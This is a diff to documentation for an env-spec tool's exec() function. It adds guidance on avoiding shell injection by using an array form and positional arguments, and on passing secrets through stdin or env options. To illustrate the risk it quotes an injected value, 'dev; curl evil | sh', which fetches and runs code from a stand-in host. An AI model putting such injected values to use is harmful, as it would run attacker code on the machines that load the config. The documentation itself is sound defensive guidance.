@@ -18,7 +18,7 @@ EXPANSION_EQUIVALENT="pre-${OTHER}-post"
 USING_FN_CALLS=concat("pre-", ref(OTHER), "-post")
 
 # mixed example
-CONFIG=exec(`./scripts/load-config.sh ${APP_ENV}`)
+CONFIG=exec(["./scripts/load-config.sh", "config-${APP_ENV}"])
 ```
 
 
@@ -76,6 +76,70 @@ Expansion equivalent: `exec(command)` === `$(command)`
 API_KEY=exec(`my-secrets-cli get api-key`)
 # Any command whose stdout becomes the value
 GIT_SHA=exec(`git rev-parse HEAD`)
+```
+
+`exec()` runs a command in one of two ways:
+
+| Form | Example | How it runs |
+|---|---|---|
+| Shell command | ``exec(`cd app && git rev-parse HEAD`)`` | Through the shell (`/bin/sh -c`, or `cmd.exe` on Windows). Pipes, `&&`, redirects and globs work. The command must be fixed text. |
+| Array | `exec(["./load-config.sh", "--env", $APP_ENV])` | The first element is the program, the rest are its arguments, one each. No shell is involved. |
+
+#### Passing values to a command
+
+The shell command must be fixed text: values can't be interpolated into it. ``exec(`./load-config.sh ${APP_ENV}`)``, `$(./load-config.sh ${APP_ENV})` and `exec($CMD)` are all schema errors. A value can come from the process environment or a `.env.local`, not only from your schema (a CI job might set it from a branch name, for example), and if it were spliced into the command, a value like `dev; curl evil | sh` would run as a second command. There are two safe ways to pass values instead.
+
+**Use the array form** when you just need to run a program with some arguments. Each element reaches the program exactly as resolved, never split or expanded, and any element can be a function, including the program itself:
+
+```env-spec "exec"
+CONFIG=exec(["./scripts/load-config.sh", "--env", $APP_ENV])
+# build one argument from several parts with ${} expansion
+SECRET=exec(["op", "read", "op://vault/${ITEM}/field"])
+# pick the program with a function
+TOKEN=exec([if($IS_PROD, "prod-cli", "dev-cli"), "get", "token"])
+```
+
+**Pass values after a shell command** when you need shell syntax. The command reads them as `"$1"`, `"$2"` and so on. The shell expands these as data and never parses them as more commands. Keep them in double quotes, or a value with spaces is split into several words:
+
+```env-spec "exec"
+TOKEN=exec(`my-cli get "$1" | jq -r .value`, $ITEM)
+URL=exec(`curl -s "$1/config" | jq -r ".$2"`, $API_HOST, $APP_ENV)
+```
+
+This needs a POSIX shell, so it isn't available on Windows. Use the array form there.
+
+The shell command can also use environment variables you pass with the `env=` option (see below), alongside `$1`, `$2`. Write the command in single quotes when it does, since env-spec reads `$NAME` inside backticks and double quotes as its own reference to another item:
+
+```env-spec "exec"
+TOKEN=exec('my-cli get "$1" --token "$MY_TOKEN" | jq -r .value', $ITEM, env={MY_TOKEN=$API_TOKEN})
+```
+
+To switch between whole commands, wrap the calls in `if()` (only the chosen one runs): ``if($IS_PROD, exec(`prod-cli get`), exec(`dev-cli get`))``.
+
+If a schema breaks these rules, the error suggests the rewrite.
+
+On Windows the array form launches executables directly, so it can't run `.cmd` or `.bat` files (like the `npx` and `pnpm` shims). Call the `.exe` instead, or use a fixed shell command.
+
+When a command fails, the error shows the command as written in the schema plus the exit code and stderr, not the resolved values, so a secret passed as an argument stays out of the output.
+
+#### Options
+
+Both forms accept these `key=value` options after the command:
+
+| Option | Meaning |
+|---|---|
+| `stdin=` | Written to the command's stdin. Use it to hand a secret to a CLI without putting it on the command line, which every process on the machine can read via `ps`. |
+| `env=` | Object literal of extra environment variables for the command, e.g. `env={VAULT_TOKEN=$VAULT_TOKEN}`. Added on top of varlock's own environment, for this command only. The other way to pass a credential without putting it on the command line. |
+| `cwd=` | Directory to run in, resolved relative to the env file that contains the `exec()`, not to wherever varlock was invoked. |
+| `timeout=` | Kill the command after this long (`"30s"`, `"2m"`, or milliseconds). The item then fails with a timeout error instead of hanging the load, which matters for a CLI that is waiting on an auth prompt nobody sees in CI. |
+
+```env-spec "exec"
+# @sensitive
+DB_PASSWORD=op(op://vault/db/password)
+# feed the password via stdin and run from the scripts directory
+DB_URL=exec(["./connection-string.sh", "--password-stdin"], stdin=$DB_PASSWORD, cwd="./scripts", timeout="30s")
+# a CLI that reads its credential from the environment
+VAULT_VALUE=exec(["vault", "kv", "get", "-field=value", "secret/app"], env={VAULT_TOKEN=$VAULT_TOKEN})
 ```
 </div>
 
